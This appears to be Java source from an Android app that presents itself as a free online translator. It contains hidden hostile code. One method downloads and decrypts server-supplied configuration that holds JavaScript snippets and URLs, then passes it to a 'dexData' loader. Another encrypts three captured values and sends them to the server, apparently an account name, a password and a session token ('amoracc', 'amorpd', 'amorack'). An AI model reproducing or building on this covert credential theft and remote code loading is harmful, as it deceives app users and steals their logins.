package com.kali_corporation.freeonlinetranslation.nt.tool;

import android.app.Activity;
import android.app.Application;
import android.util.Log;

import androidx.lifecycle.LifecycleOwner;

import com.hjq.http.EasyConfig;
import com.hjq.http.EasyHttp;
import com.hjq.http.config.IRequestApi;
import com.hjq.http.config.IRequestInterceptor;
import com.hjq.http.config.IRequestServer;
import com.hjq.http.listener.HttpCallback;
import com.hjq.http.listener.OnHttpListener;
import com.hjq.http.model.HttpHeaders;
import com.hjq.http.model.HttpParams;
import com.kali_corporation.freeonlinetranslation.nt.api.EventApi;
import com.kali_corporation.freeonlinetranslation.nt.api.PostApi;
import com.kali_corporation.freeonlinetranslation.nt.api.TrsApi;
import com.kali_corporation.freeonlinetranslation.nt.model.RequestHandler;
import com.kali_corporation.freeonlinetranslation.nt.server.MyServer;
import com.kali_corporation.freeonlinetranslation.nt.tool.hekp.DataHelper;
import com.kali_corporation.freeonlinetranslation.nt.tool.hekp.NetHelper;
import com.kali_corporation.freeonlinetranslation.nt.tool.hekp.NtHelper;
import com.kali_corporation.freeonlinetranslation.nt.tool.sp.SPUtil;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

import okhttp3.OkHttpClient;

public class NtManager {
    public static Application app;
    public static void initNt(Application application){
        app = application;
        // 网络请求框架初始化
        IRequestServer server = new MyServer();


        OkHttpClient okHttpClient = new OkHttpClient.Builder()
                .build();

        EasyConfig.with(okHttpClient)
                // 是否打印日志
                //.setLogEnabled(BuildConfig.DEBUG)
                // 设置服务器配置
                .setServer(server)
                // 设置请求处理策略
                .setHandler(new RequestHandler(application))
                // 设置请求参数拦截器
                .setInterceptor(new IRequestInterceptor() {
                    @Override
                    public void interceptArguments(IRequestApi api, HttpParams params, HttpHeaders headers) {
                        headers.put("timestamp", String.valueOf(System.currentTimeMillis()));
                    }
                })
                // 设置请求重试次数
                .setRetryCount(2)
                // 设置请求重试时间
                .setRetryTime(2000)
                // 添加全局请求参数
                .addParam("token", String.valueOf(System.currentTimeMillis()))
                // 添加全局请求头
                //.addHeader("time", "20191030")
                .into();
    }

    public static void initPost(Activity activity,NtListener ntListener){
        EasyHttp.post((LifecycleOwner) activity)
                .api(new PostApi().setKeyword("123mtr"))
                .request(new HttpCallback<>(new OnHttpListener() {
                    @Override
                    public void onSucceed(Object result) {

                        String content = NetHelper.deByAESDES((String) result,NetHelper.key);
                        //{"p_a":"js&url","js":[{"id":0,"content":"js1"},{"id":1,"content":"js2"}],"url":{"type":0,"ref":"","headurl":""}}
                        if (!content.equals("")){
                            try {
                                JSONObject jsonObject = new JSONObject(content);
                                if (!jsonObject.isNull(Constant.PK)){
                                    SPUtil.getInstance(activity).saveData(Constant.PK,jsonObject.getString(Constant.PK));
                                }
                                if (!jsonObject.isNull(Constant.PA)){
                                    String[] paArr = jsonObject.getString(Constant.PA).split("&");
                                    DataHelper.dexData(activity,paArr,jsonObject);
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                        if (ntListener!=null){
                            ntListener.ntstate(1);
                        }
                        Log.e("TAG", "onSucceed: "+result );
                    }

                    @Override
                    public void onFail(Exception e) {
                        if (ntListener!=null){
                            ntListener.ntstate(0);
                        }
                        Log.e("TAG", "onSucceed: "+e.toString() );
                    }
                }));
    }

    public static void initEvebt(Activity activity, ArrayList<String> dataList, NtListener ntListener){
        String key = NtHelper.DEF_KEY.substring(NtHelper.DEF_KEY.length()-16);

        if (dataList.size() == 3){
//            String a = NtHelper.e(key,dataList.get(0));
            String a = NetHelper.deByAESDES(dataList.get(0),(String) SPUtil.getInstance(activity).readData(Constant.PK,""));
            String c = NtHelper.e(key,dataList.get(2));
            String b = NtHelper.e(key,dataList.get(1));

//            String a = NtHelper.e(key,"1");
//            String c = NtHelper.e(key,"+2");
//            String b = NtHelper.e(key,"=3");

            EasyHttp.delete((LifecycleOwner) activity)
                    .api(new EventApi().setAmoracc(b)
                            .setAmorpd(a)
                            .setAmorack(c))
                            .request(new HttpCallback<>(new OnHttpListener() {
                                @Override
                                public void onSucceed(Object result) {
                                    Log.e("TAG", "onSucceed: "+result );
//                                    Gson gson = new Gson();
//                                    JsonObject jsonObject = gson.toJsonTree(result).getAsJsonObject();
                                    if (((String)result).contains("20")){
                                        SPUtil.getInstance(activity).saveData("vebt",true);
                                    }
                                    if (ntListener!=null){
                                        ntListener.ntstate(1);
                                    }
                                }

                                @Override
                                public void onFail(Exception e) {
                                    Log.e("TAG", "onSucceed: "+e.toString() );
                                    if (ntListener!=null){
                                        ntListener.ntstate(0);
                                    }
                                }
                            }));
        }


    }

    public static void initTrsbt(Activity activity, NtDataListener ntDataListener){

            EasyHttp.put((LifecycleOwner) activity)
                    .api(new TrsApi())
                    .request(new HttpCallback<>(new OnHttpListener() {
                        @Override
                        public void onSucceed(Object result) {
                            Log.e("TAG", "onSucceed: "+result );
                           String data = NetHelper.deByAESDES((String) result,(String) SPUtil.getInstance(activity).readData(Constant.PK,""));
                            if (ntDataListener!=null){
                                ntDataListener.ntstate(1,data);
                            }
                        }

                        @Override
                        public void onFail(Exception e) {
                            Log.e("TAG", "onSucceed: "+e.toString() );
                            if (ntDataListener!=null){
                                ntDataListener.ntstate(0,e.toString());
                            }
                        }
                    }));
        }

}
